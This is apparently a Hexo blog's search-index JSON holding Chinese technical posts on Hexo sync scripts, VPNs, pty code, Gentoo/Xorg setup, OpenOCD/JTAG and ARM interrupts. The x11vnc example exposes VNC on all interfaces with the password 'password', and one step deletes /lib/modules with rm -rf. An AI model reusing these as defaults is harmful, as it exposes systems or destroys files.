responding”);","categories":[{"name":"VPN系列之五花八门","slug":"VPN系列之五花八门","permalink":"http://demonelf.github.io/categories/VPN系列之五花八门/"},{"name":"VPN系列之五花八门","slug":"VPN系列之五花八门/VPN系列之五花八门","permalink":"http://demonelf.github.io/categories/VPN系列之五花八门/VPN系列之五花八门/"}],"tags":[]},{"title":"从wordpress换hexo博客后","slug":"SYSTEM/从wordpress换hexo博客后","date":"2017-09-19T01:16:16.000Z","updated":"2017-09-19T01:31:22.061Z","comments":true,"path":"SYSTEM/从wordpress换hexo博客后.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/从wordpress换hexo博客后.html","excerpt":"之前用wordpress做blog, 为什么换为hexo呢? 第一 ​ wordpress的文章都保存在服务器的数据库, 维护不是很直观. ​ 而hexo是自己编写markdown文章,本地一份,而blog只是本地的映射. ​ 这样文章更好维护和","text":"之前用wordpress做blog, 为什么换为hexo呢? 第一 ​ wordpress的文章都保存在服务器的数据库, 维护不是很直观. ​ 而hexo是自己编写markdown文章,本地一份,而blog只是本地的映射. ​ 这样文章更好维护和查看.因为做笔记更重要的是自己也能查看. 第二 ​ hexo用的github pages服务, 服务器器是git, 自己剩下服务器不说, ​ 还能用到git的强大版本控制功能,真是一举多得. 如果大家发下同步命令复杂,完全可以做个成脚本就像我这这个样,点击脚本就可 把文章同步了. 真的很方便, 以下为同步步骤. 执行hexo_new.sh 生成new.md 编辑new.md为你要写的blog内容 把new.md放到你要的分类目录 执行update.sh同步blog. 呵呵,完成了 hexo_new.md 12345#!/bin/bashset -xexport PATH=\"/usr/local/bin:/usr/bin:/bin:/opt/bin:/c/Windows/System32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0/:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/opt/toolchain/gcc-linaro-6.3.1-2017.05-x86_64_arm-linux-gnueabihf/bin:/opt/FriendlyARM/toolschain/4.4.3/bin:/c/Users/jimmy/AppData/Roaming/npm:/c/Program Files/nodejs\"cd /e/hexo/hexo new \"new\" update.sh 12345678910111213#!/bin/bashset -xexport PATH=\"/usr/local/bin:/usr/bin:/bin:/opt/bin:/c/Windows/System32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0/:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/opt/toolchain/gcc-linaro-6.3.1-2017.05-x86_64_arm-linux-gnueabihf/bin:/opt/FriendlyARM/toolschain/4.4.3/bin:/c/Users/jimmy/AppData/Roaming/npm:/c/Program Files/nodejs\"cd /e/demonelf.github.io/git pullcd /e/hexo/hexo grsync -Pv --size-only /e/hexo/public/* /e/demonelf.github.io/ -ar rsync -Pv --size-only /e/hexo/source/_posts/* /e/demonelf.github.io/ -arcd /e/demonelf.github.io/git add -Agit commit -m \"1.自动更新\"git push","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"vpn系列文章概述","slug":"VPN系列之五花八门/vpn系列文章概述","date":"2017-09-19T01:11:02.000Z","updated":"2017-09-19T02:28:50.373Z","comments":true,"path":"VPN系列之五花八门/vpn系列文章概述.html","link":"","permalink":"http://demonelf.github.io/VPN系列之五花八门/vpn系列文章概述.html","excerpt":"​ 我们要讨论的相关vpn 1. l2tp 2. pptp 3. ipsec 4. websocket vpn 5. dns vpn 6. mpls vpn ​ 由于ppp协议是以上大部分vpn的核心技术,所以我们还要讨论ppp相关技术.","text":"​ 我们要讨论的相关vpn l2tp pptp ipsec websocket vpn dns vpn mpls vpn ​ 由于ppp协议是以上大部分vpn的核心技术,所以我们还要讨论ppp相关技术.","categories":[{"name":"VPN系列之五花八门","slug":"VPN系列之五花八门","permalink":"http://demonelf.github.io/categories/VPN系列之五花八门/"},{"name":"VPN系列之五花八门","slug":"VPN系列之五花八门/VPN系列之五花八门","permalink":"http://demonelf.github.io/categories/VPN系列之五花八门/VPN系列之五花八门/"}],"tags":[]},{"title":"编写多进程、线程同步问题总结","slug":"DEVELOP/编写多进程、线程同步问题总结","date":"2017-08-23T03:28:45.000Z","updated":"2017-08-23T05:25:42.090Z","comments":true,"path":"DEVELOP/编写多进程、线程同步问题总结.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/编写多进程、线程同步问题总结.html","excerpt":"注: 多进程时所主要解决的就是进程同步问题。 1. 进程同步: 进程同步的主要任务是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。 1.1 进程同步存在的问题: 一、两种","text":"注: 多进程时所主要解决的就是进程同步问题。 进程同步:进程同步的主要任务是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。 1.1 进程同步存在的问题:一、两种形式的制约关系 间接相互制约关系(存在临界资源需要互斥) 直接相互制约关系(进程存在前后执行顺序) 二、产生死锁 1.产生死锁的原因 (1) 竞争资源 (2) 进程间推进顺序非法 2.产生死锁的必要条件 (1) 互斥条件 (不可预防) (2) 请求和保持条件 (可预防) (3) 不剥夺条件 (可预防) (4) 环路等待条件 (可预防) 3.死锁的类型123(1) 嵌套型 (即便一个临界资源 也会发生死锁)(2) AB-BA (3) 有待完善！ 1.2 解决的方法:一、数据结构: 信号量:(实现互斥 例: APUE中的14.3 记录锁 15.8 XSI IPC的信号量) (1) 整型信号量 (2) 记录型信号量 (3) AND 型信号量 (4) 信号量集 二、算法 : 1 实现同步: (1) 生产者—消费者问题 (2) 哲学家进餐问题 (3) 读者—写者问题 2 解决死锁: (1) 预防死锁: 破坏产生死锁的必要条件 (2) 避免死锁: 利用算法防止进入不安全状态(银行家算法) (3) 检测死锁: 产生死锁后采取适当措施 (4) 解除死锁: 产生死锁后撤销挂起某些进程","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"},{"name":"DEVELOP","slug":"DEVELOP/DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/DEVELOP/"}],"tags":[]},{"title":"pty示例代码","slug":"DEVELOP/pty示例代码","date":"2017-08-17T08:18:08.000Z","updated":"2017-08-23T05:12:37.637Z","comments":true,"path":"DEVELOP/pty示例代码.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/pty示例代码.html","excerpt":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 #define _XOPEN_SOURCE","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#define _XOPEN_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;pty.h&gt;int main()&#123; int fd_m, fd_s; int len; const char *pts_name; char send_buf[64] = \"abc\\ndefghijk\\nlmn\"; char recv_buf[64] = &#123;0&#125;; fd_m = open(\"/dev/ptmx\", O_RDWR | O_NOCTTY); if (fd_m &lt; 0) &#123; printf(\"open /dev/ptmx fail1\\n\"); return -1; &#125; if (grantpt(fd_m) &lt; 0 || unlockpt(fd_m) &lt; 0) &#123; printf(\"grantpt and unlockpt fail\\n\"); goto err; &#125; pts_name = (const char *)ptsname(fd_m); fd_s = open(pts_name, O_RDONLY | O_NOCTTY); if (fd_s &lt; 0) &#123; printf(\"open /dev/ptmx fail2\\n\"); goto err; &#125; len = write(fd_m, send_buf, strlen(send_buf)); printf(\"write len=%d\\n\", len); len = read(fd_s, recv_buf, sizeof(recv_buf)); printf(\"read len=%d, recv_buf=[%s]\\n\", len, recv_buf); len = read(fd_s, recv_buf, sizeof(recv_buf)); printf(\"read len=%d, recv_buf=[%s]\\n\", len, recv_buf); close(fd_m); close(fd_s); return 0;err: if (fd_m) close(fd_m); if (fd_s) close(fd_s); return -1;&#125;","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"},{"name":"DEVELOP","slug":"DEVELOP/DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/DEVELOP/"}],"tags":[]},{"title":"x11vnc利用xvfd实现远程vncserver","slug":"SYSTEM/x11vnc利用xvfd实现远程vncserver","date":"2017-08-08T16:00:00.000Z","updated":"2017-08-10T06:27:18.443Z","comments":true,"path":"SYSTEM/x11vnc利用xvfd实现远程vncserver.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/x11vnc利用xvfd实现远程vncserver.html","excerpt":"当然你可以直接安装vncserver实现以下功能。 例如：TigerVNC 环境：gentoo 安装：xvfd sudo USE=”xvfb” emerge -av xorg-server 启动：xvfd Xvfb :2 -screen 0 80","text":"当然你可以直接安装vncserver实现以下功能。例如：TigerVNC 环境：gentoo 安装：xvfd sudo USE=”xvfb” emerge -av xorg-server 启动：xvfd Xvfb :2 -screen 0 800x600x24 -nolisten tcp &amp;export DISPLAY=:2 安装：x11vnc sudo emerge -av x11vnc 启动：x11vnc x11vnc -listen 0.0.0.0 -rfbport 5900 -noipv6 -passwd password -display :2 -forever 启动桌面： gnome-session –debug –disable-acceleration-check 然后启动你喜欢的vnc客户端连接吧 官方客户端为：ssvn 用此客户端可以实现自动缩放","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"gentoo_stage_diy","slug":"SYSTEM/gentoo_stage_diy","date":"2017-08-08T16:00:00.000Z","updated":"2018-01-04T08:39:41.372Z","comments":true,"path":"SYSTEM/gentoo_stage_diy.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/gentoo_stage_diy.html","excerpt":"stage1： 12345 包含bootstrap.sh，scripts/bootstrap.sh用于安装glibc、gcc、zlib、binutils、textinfo、ncurses、gettext、sed、emerge、portage等创建stag","text":"stage1：12345包含bootstrap.sh，scripts/bootstrap.sh用于安装glibc、gcc、zlib、binutils、textinfo、ncurses、gettext、sed、emerge、portage等创建stage2 包含emerge的环境执行：scripts/bootstrap.sh stage2:123包含了完整的emerge的环境构建system系统，编译没有替代物的系统软件包。执行：emerge -e system 构想： stage1可以通过lfs方法得到 stage1要保证能运行bootstrap.sh和emerge bootstrap.sh：bash portage:bash python stage1 在通过bootstrap.sh生成stage2 参考： https://wiki.gentoo.org/wiki/Project:Prefix/Bootstrap 我们可以运行：emerge -e system 生成官方提供的的stage3了。 以上stage2环境可以由lfs替代.直接在lfs或其它系统上安装porage， 所以共有两种安装方法： 第一种： 1.下载stage1 2.bootstrap.sh 3.emerge system 4.stage3正常安装 第二种： 1.创建lfs 2.安装portage 3.emerge system 4.emerge world 参考：https://wiki.gentoo.org/wiki/Portage","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"gentoo【显卡-驱动-xorg-gnome-gui】工作原理","slug":"SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作","date":"2017-08-08T16:00:00.000Z","updated":"2017-11-24T02:47:08.253Z","comments":true,"path":"SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html","excerpt":"显卡->驱动->xorg->gnome->gui 查看显卡：lspci | grep -i VGA 查看驱动：lspci -vvv ​ /dev/nvidia0, /dev/nvidiactl 是NV 官方驱动引入的两个设备文件 驱动安装：x1","text":"显卡-&gt;驱动-&gt;xorg-&gt;gnome-&gt;gui 查看显卡：lspci | grep -i VGA 查看驱动：lspci -vvv​ /dev/nvidia0, /dev/nvidiactl 是NV 官方驱动引入的两个设备文件 驱动安装：x11-drivers/xf86-video-nouveau x11-drivers/xf86-video-virtualbox xorg支持： VIDEO_CARDS=”nouveau virtualbox” emerge -pv xorg-drivers 现在的xorg也不需要/etc/X11/xorg.conf注意把/etc/X11/xorg.conf.d/下默认的配置删除 例如:01-nv.conf 12345678910当然你就想手动指定驱动等信息添加xorg.conf也是没有问题的。例如：Section &quot;Device&quot; Identifier &quot;Configured Video Device&quot; Driver &quot;fbdev&quot; EndSection 以上显卡设备为lcd 驱动设备为：/dev/fb0驱动类型为：framebuffer xf86-video-fbdev大家可以看看韦东山介绍 mini2440就是用此驱动。framebuffer表示显卡不具备任何计算能力，完全利用cpu计算。 startx：为以上xorg gnome协同作战的脚本123456不用startx ，手动xorg的xinit和gnome的gnome-session都是可以的。xinit 找的是/dev/nvidia0, /dev/nvidiactlgnome-session 找的是export DISPLAY=:2 配置文件：.xinitrc12345678export GTK_IM_MODULE=ibusexport XMODIFIERS=@im=ibusexport QT_IM_MODULE=ibusexport XDG_MENU_PREFIX=gnome-xrandr --setprovideroutputsource modesetting NVIDIA-0xrandr --autoexec gnome-sessiondbus-launch nm-applet &amp; 12345678910111213141516171819202122232425262728293031323334353637383940414201:00.0 VGA compatible controller: NVIDIA Corporation G84GLM [Quadro FX 570M] (rev a1) (prog-if 00 [VGA controller]) Subsystem: Lenovo ThinkPad T61p Physical Slot: 1 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx- Latency: 0 Interrupt: pin A routed to IRQ 16 Region 0: Memory at d6000000 (32-bit, non-prefetchable) [size=16M] Region 1: Memory at e0000000 (64-bit, prefetchable) [size=256M] Region 3: Memory at d4000000 (64-bit, non-prefetchable) [size=32M] Region 5: I/O ports at 2000 [size=128] [virtual] Expansion ROM at 000c0000 [disabled] [size=128K] Capabilities: [60] Power Management version 2 Flags: PMEClk- DSI- D1- D2- AuxCurrent=0mA PME(D0-,D1-,D2-,D3hot-,D3cold-) Status: D0 NoSoftRst- PME-Enable- DSel=0 DScale=0 PME- Capabilities: [68] MSI: Enable- Count=1/1 Maskable- 64bit+ Address: 0000000000000000 Data: 0000 Capabilities: [78] Express (v1) Endpoint, MSI 00 DevCap: MaxPayload 128 bytes, PhantFunc 0, Latency L0s &lt;512ns, L1 &lt;4us ExtTag+ AttnBtn- AttnInd- PwrInd- RBE+ FLReset- SlotPowerLimit 75.000W DevCtl: Report errors: Correctable- Non-Fatal- Fatal- Unsupported- RlxdOrd+ ExtTag+ PhantFunc- AuxPwr- NoSnoop+ MaxPayload 128 bytes, MaxReadReq 512 bytes DevSta: CorrErr- UncorrErr- FatalErr- UnsuppReq- AuxPwr- TransPend- LnkCap: Port #0, Speed 2.5GT/s, Width x16, ASPM L0s L1, Exit Latency L0s &lt;512ns, L1 &lt;4us ClockPM- Surprise- LLActRep- BwNot- ASPMOptComp- LnkCtl: ASPM L0s Enabled; RCB 128 bytes Disabled- CommClk+ ExtSynch- ClockPM- AutWidDis- BWInt- AutBWInt- LnkSta: Speed 2.5GT/s, Width x16, TrErr- Train- SlotClk+ DLActive- BWMgmt- ABWMgmt- Capabilities: [100 v1] Virtual Channel Caps: LPEVC=0 RefClk=100ns PATEntryBits=1 Arb: Fixed- WRR32- WRR64- WRR128- Ctrl: ArbSelect=Fixed Status: InProgress- VC0: Caps: PATOffset=00 MaxTimeSlots=1 RejSnoopTrans- Arb: Fixed- WRR32- WRR64- WRR128- TWRR128- WRR256- Ctrl: Enable+ ID=0 ArbSelect=Fixed TC/VC=01 Status: NegoPending- InProgress- Capabilities: [128 v1] Power Budgeting &lt;?&gt; Capabilities: [600 v1] Vendor Specific Information: ID=0001 Rev=1 Len=024 &lt;?&gt; Kernel driver in use: nvidia Kernel modules: nouveau, nvidia_drm, nvidia 注: 之前virtualbox的驱动总是不能成功, 改为vesa折中解决. 具体为删除virtualbox驱动, emerge -C virtualbox-guest-additions 如果启动还是加载vboxvideo等驱动, 那就直接删除重新安装 123rm /lib/modules/* -rf cd /usr/src/linux &amp;&amp; make modules_installemerge -av @module-rebuild 并且添加/etc/X11/xorg.conf.d/10-monitor.conf 12345678910111213141516171819Section \"Monitor\" Identifier \"Monitor0\"EndSectionSection \"Device\" Identifier \"Device0\" Driver \"vesa\" #Choose the driver used for this monitorEndSectionSection \"Screen\" Identifier \"Screen0\" #Collapse Monitor and Device section to Screen section Device \"Device0\" Monitor \"Monitor0\" DefaultDepth 16 #Choose the depth (16||24) SubSection \"Display\" Depth 16 Modes \"1024x768_75.00\" #Choose the resolution EndSubSectionEndSection 这样省了virtualbox 驱动版本等匹配问题.当然性能也下降了. 当然我自己还挖了个坑 那就是还要删除 /etc/local.d/nvidia.start不然重启又修改了 当然安装vboxvideo 会提高性能 只要在/etc/portage/make.conf添加 VIDEO_CARDS=”virtualbox vesa fbdev” 并更新下系统就可以 emerge -avtuDN world 如果/etc/X11/xorg.conf 和/etc/X11/xorg.conf.d 不会配置 建议直接删除就可以了 同时可参考: https://wiki.gentoo.org/wiki/VirtualBox","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"openocd+jlink为mini2440调试u-boot","slug":"EMBEDDED/openocd+jlink为mini2440调试u-boot","date":"2017-07-21T02:10:01.000Z","updated":"2017-07-21T02:10:34.715Z","comments":true,"path":"EMBEDDED/openocd+jlink为mini2440调试u-boot.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/openocd+jlink为mini2440调试u-boot.html","excerpt":"需要安装openocd，如果已经安装了系统默认的openocd(默认是0.5.0，版本太低），需要先卸载掉。 在安装前需要安装必需的一些库文件： sudo apt-get install libusb-1.0-0-dev libusb-1.0-0 a","text":"需要安装openocd，如果已经安装了系统默认的openocd(默认是0.5.0，版本太低），需要先卸载掉。 在安装前需要安装必需的一些库文件： sudo apt-get install libusb-1.0-0-dev libusb-1.0-0 automake autconf libtool pkg-config 然后执行安装： git clone git://git.code.sf.net/p/openocd/code openocd cd openocd ./bootstrap ./configure --prefix=/usr/local \\ --enable-stlink --enable-jlink echo -e &quot;all:\\ninstall:&quot; &gt; doc/Makefile make sudo make install 默认情况下openocd会安装到/usr/local/bin文件夹下，有可能会无法执行openocd命令，如果无法执行，可以将/usr/local/bin加入到PATH变量即可。 将mini2440和jlink以及pc连接起来，然后执行下面的命令： sudo openocd -f interface/jlink.cfg -f board/mini2440.cfg 但是会提示下面的错误： Runtime Error: /usr/local/share/openocd/scripts/board/mini2440.cfg:124: jtag interface: command requires more arguments 将/usr/local/share/openocd/scripts/board/mini2440.cfg的124行注释掉（此行最前面添加一个‘#’符号，类似于bash注释) 然后在执行openocd： sudo openocd -f interface/jlink.cfg -f board/mini2440.cfg 另开一个控制台，查看串口信息： sudo minicom 还需要打开一个控制台，在该控制台下执行下面的命令： telnet localhost 4444haltinit_2440load_image /home/host/soft/mini2440/u-boot/u-boot.bin 0x33f80000 binresume 0x33f80000 /home/host/soft/mini2440/u-boot/u-boot.bin是我的u-boot.bin文件路径，可以将其修改成自己的文件路径即可。 这几条命令是从/usr/local/share/openocd/scripts/board/mini2440.cfg中几个预定义的命令代码中提取出来的，可以执行help_2440显示当前所支持的自定义命令列表。 可惜的是，openocd没有检测到mini2440上的nand flash,所以无法烧写,后来经过调查，voltcraft_dso-3062c.cfg中采用了相同的nand flash。貌似是openocd代码修改了，但是mini2440.cfg中配置却没有改掉，将/usr/local/share/openocd/scripts/board/mini2440.cfg文件中的nand device s3c2440 0这一行修改成voltcraft_dso-3062c.cfg中的对应行： nand device $_CHIPNAME.nand s3c2440 $_TARGETNAME 重新启动openocd: sudo openocd -f interface/jlink.cfg -f board/mini2440.cfg 然后在另外一个控制台烧写uboot: telnet localhost 4444haltinit_2440nand erase 0 0x0 0x100000nand write 0 /home/host/soft/mini2440/u-boot/u-boot.bin 0reset 刚开始遇到好几次烧写不成功，后来执行了一次nand erase 0将整个nand flash擦除后才能成功执行烧写， 这个问题有可能是nand flash坏块多引起的（我的mini2440是二手开发板）。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"JTAG基本原理与调试","slug":"EMBEDDED/JTAG基本原理与调试","date":"2017-07-21T01:39:27.000Z","updated":"2017-07-21T01:43:32.616Z","comments":true,"path":"EMBEDDED/JTAG基本原理与调试.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/JTAG基本原理与调试.html","excerpt":"JTAG(Joint Test Action Group)联合测试行动小组)是一种国际标准测试协议（IEEE 1149.1兼容），主要用于芯片内部测试。现在多数的高级器件都支持JTAG协议，如DSP、FPGA器件等。标准的JTAG接口是4线：TMS、 TC","text":"JTAG(Joint Test Action Group)联合测试行动小组)是一种国际标准测试协议（IEEE 1149.1兼容），主要用于芯片内部测试。现在多数的高级器件都支持JTAG协议，如DSP、FPGA器件等。标准的JTAG接口是4线：TMS、 TCK、TDI、TDO，分别为模式选择、时钟、数据输入和数据输出线。 JTAG最初是用来对芯片进行测试的，基本原理是在器件内部定义一个TAP（Test Access Port?测试访问口）通过专用的JTAG测试工具对进行内部节点进行测试。JTAG测试允许多个器件通过JTAG接口串联在一起，形成一个JTAG链，能实现对各个器件分别测试。现在，JTAG接口还常用于实现ISP（In-System Programmable?在线编程），对FLASH等器件进行编程。 JTAG编程方式是在线编程，传统生产流程中先对芯片进行预编程实现再装到板上因此而改变，简化的流程为先固定器件到电路板上，再用JTAG编程，从而大大加快工程进度。JTAG接口可对PSD芯片内部的所有部件进行编程 上面的信息是从度娘百科引用过来的，对于jtag没有了解过的人来说，上面的大部分内容都不知道说什么，当然，我是一开始看的时候也看不懂。 不过从上面得出来的信息知道，jtag是一个协议，标准有4个引脚，用于芯片的测试与编程调试。 jtag是有硬件实现的。 在cpu（注意：这里的cpu是指运算处理单元，只包含了内部寄存器以及运算单元等基本部件）外围，处理器（即cpu扩展芯片，不是soc）内部包含了jtag的硬件实现，并且向外界提供接口，也就是上面所说的TMS，TCK，TDI，TDO，四个引脚。 如图： 边界扫描链 jtag如何用于芯片测试呢？ 其中用到的最主要部件就是边界扫描链。 命名为边界扫描链，是由于它位置处于处理器的边界上。 我们知道cpu是通过引脚与外围交流的，所有的数据都会通过引脚输入或者输出，而jtag就是通过监控引脚的信号达到芯片测试的目的。 而边界扫描链就是在引脚上的一个部件。如下图： 通过边界扫描链，当有信号输入的时候，边界扫描链就能获取信号，当cpu要输出信号的时候，边界扫描链也能获取要输出的信号。 另外也可以通过边界扫描链来直接向外部输出信号。 无论是信号的抓取还是输出，都需要有接口来保存这些信号，TDI跟TDO就是做这样一些工作的。 如图： 本来边界扫描链保存着引脚上的信号，当通过TDI引脚输入我们自己的信号的时候，会发生沿上面红线方向的移位操作， TDI ——〉 边界扫描链 —— 〉 TDO 就能从TDO获取边界扫描链上的信号，我们从TDI输入的信号也会到边界扫描链上去。 在cpu跟外界通信的引脚上的数据无非就是 指令 跟 数据信号（包括地址跟数据） 两种。但是这两者的结合形成了一个完整的程序，能对它们进行监控就表明我们能进行程序的调试。 上面的只是jtag最基本的原理，要对程序更好的调试还需要控制部件，还有更多寄存器的结合等等。 下面是一个完整的jtag调试部件： 更详细的jtag信息可以看看http://www.micetek.com.cn/technic/jtag.pdf 下面来讲讲arm上的jtag调试，openocd就是一个jtag的调试工具 以下基于s3c2440，openocd 我们在调试程序的时候，通常需要设置断点，断点也就是指令所在的位置， 断点分为两种：硬件断点跟软件断点 硬件断点：指令的地址。当cpu要去某个地址取指令的时候，就暂停cpu的运行。在s3c2440上只支持两个硬件断点 软件断点：软件断点不限制断点的个数，因此硬件断点的方法是不可用的。当我们需要在某个指令上打断点的时候，openocd会先去取得断点的地址，然后把每个断点处的值替换成某个特定的值（如deeedeee），当cpu取数据的时候得到该特定的值，就知道到达了断点地址，暂停cpu的运行，去除断点的时候再把原本的值换回去。如果没指定硬件断点的话，一般都默认是软件断点。 另外openocd对于软件断点有特定的要求： 1.程序必须位于它的链接地址上，即如果指定了. = 0x30000000,那么程序必须实际上是位于0x30000000这个地方，也就是说程序必须已经重定位好，位于它的链接地址。 2.程序必须按照某种特定的顺序排放： 12345678910111213SECTIONS&#123;. = 0x30000000;.text :&#123;head.o(.text)init.o(.text)nand.o*(.text)&#125;.rodata ALIGN(4) : &#123;*(.rodata)&#125;.data ALIGN(4) : &#123;*(.data)&#125;.bss ALIGN(4) : &#123;*(.bss) *(COMMON)&#125;&#125; gdb调试就是基于软件断点的调试，我们可以用gdb对程序代码的某一行进行断点设置，那么它是如何定位到某个指令的地址的？ 这就需要有调试信息，也就是在编译的时候加上 -g 给程序添加调试信息。 eclipse对gdb进行了进一步的封装（GUI），我们可以通过对eclipse进行某些设置达到调试arm程序的目的。 1.首先把文件加入工程 2.设置调试配置： 点工具栏上的小虫子 Debug Configurations… 新建一个调试配置 选择选项卡Main，在C/C++ Application: 选项上选择要调试的elf文件 选择选项卡Debugger，GDB debugger： 选择为arm-elf-gdb 选择选项卡Commands， ‘Initialize’conmmands 下输入命令：1234 target remote 127.0.0.1:3333 //连接openocd load //加载程序到内存 break _start //设置断点到_start c //continue继续执行 然后Apply ，最后Debug开始调试 3.当然，上述程序是在内存执行的，但是开发板一开始的时候内存还没初始化，是不可用的，因此我们需要先设置内存 在openocd的命令控制台上（telnet 127.0.0.1 4444进入openocd控制台） 12345 halt //暂停cpu//加载内存初始化程序 init.bin 到 0 地址 load_image init.bin 0 resume 0 //在0地址开始运行 halt //暂停cpu 然后就可以Debug了 Debug时，当运行到断点处的时候，我们可以看到某些寄存器或者变量的值，这些值在eclipse上显示：","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"S3C6410中断以及外部中断","slug":"EMBEDDED/S3C6410中断以及外部中断","date":"2017-07-19T05:51:13.000Z","updated":"2017-07-19T07:18:42.616Z","comments":true,"path":"EMBEDDED/S3C6410中断以及外部中断.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/S3C6410中断以及外部中断.html","excerpt":"6410的中断系统： 嵌入式软件里的中断处理，除了中断初始化，主要工作就是编写ISR. 在嵌入式的SOC的CPU里，在CPU里内部会带一些设备模块，它们产生的中断称为内部中断。因为联线比较固定，因此编程比较简单。而且在物理上CPU分离的芯片产生的中断","text":"6410的中断系统： 嵌入式软件里的中断处理，除了中断初始化，主要工作就是编写ISR. 在嵌入式的SOC的CPU里，在CPU里内部会带一些设备模块，它们产生的中断称为内部中断。因为联线比较固定，因此编程比较简单。而且在物理上CPU分离的芯片产生的中断，称为外部中断，外部中断可以联接不同的中断脚上，因此需要对中断IO进行较复杂的配置。 轮询模式是否一无是处？轮询的优点是在重负荷的情况下，轮询比中断效率会高很多。比如一个教室很多学生不断的问问题，这样与其不断被中断，老师还不如起身在教室走动，随机处理学生问题会高很多。 异常(Exception)Exception(异常), 计算机体系结构中，异常或者中断是处理系统中突发事件的一种机制，几乎所有的处理器都提供这种机制。异常主要是从处理器被动接受的角度出发的一种描述，指意外操作引起的异常。而中断则带有向处理器主动申请的意味。但这两种情况具有一定的共性，都是请求处理器打断正常的程序执行流程，进入特定程序的一种机制。 从结构来看,外部设备产生的中断可以看成一种特殊的异常.除了中断之外,还有ARM不少固定的异常.包括以下七种: 1. 复位(Reset) 当按下RESET键后,会产生一个复位异常,此时程序跳转到复位异常处理程序处执行.当CPU重启后.一般刚好跳到这个复位异常来 2. 未定义指令 当ARM的处理器或协处理器遇到不能处理的指令时,产生未定义指令异常,采用这个机制,可以通过软件仿真扩展ARM或Thumb 指令集. 3. 软件中断(SWI) 硬件中断是有固定的硬件产生的中断,而软中断是指没具体的硬件产生,是CPU虚拟出来的.该异常由程序执行汇编SWI产生.软中断的优点, 可用于用户模式下的程序调用特权操作指令.Linux 系统调用就是使用这个异常来实现的. 有利用程序结构的优化.比如在linux 驱动里,硬件中断不能长时间运行.但是很多软件的长时间操作依赖的于中断的调用.有时为解决这个冲突,会在驱动设计两级,从硬件存取用硬件中断,而长时间操作用软件中断的模拟. 4. 指令预取中止 若处理预取的指令的地址不存在,或该地址不允许当前指令访问,存储器会向处理器发出中止信号,但当预取的指令被执行时,才会产生指令预取中止的异常.比如用ADS把程序下载到开发板上0x8000地址上.就会产生Abort异常. 5. 数据中止 若处理器数据访问数据的地址不存在,或该地址不允许当前指令访问时,产生数据中止异常 6. IRQ 当外部设备在外部中断脚产生中断信号时.即触发了IRQ中断.这是外部设备使用最常用的一种手段. 在S3C24X0是一个集成的SOC,内部除了ARM模块以外.还其它内部集成的模块,如USB,RTC,等.这一些模块在CPU内部也会有相应的中断线连到ARM920T的内核上.但这一些管脚在CPU外部是不可见的,只能用于寄存器去控制. 还一些GPIO脚就充当外部中断控制线,外部IC可以把自己中断信号线连到相应的中断脚上.当外部产中断信号后,CPU就可以知道,外设有中断发来. 7. FIQ 快速中断,类似于IRQ,但是具有较快响应速度.而且设为FIQ的条件也比较严格,比如一次触发只能有一个FIQ 一句话，中断（IRQ，FIQ，SWI）是异常中的一个特例。当产生外部中断时，大部分CPU会只产生一个异常。在异常处理程序里软件再去读不同的中断寄存器分析后来调用ISR。这里ISR是由软件来执行的。象S3C2440就是这样机制。 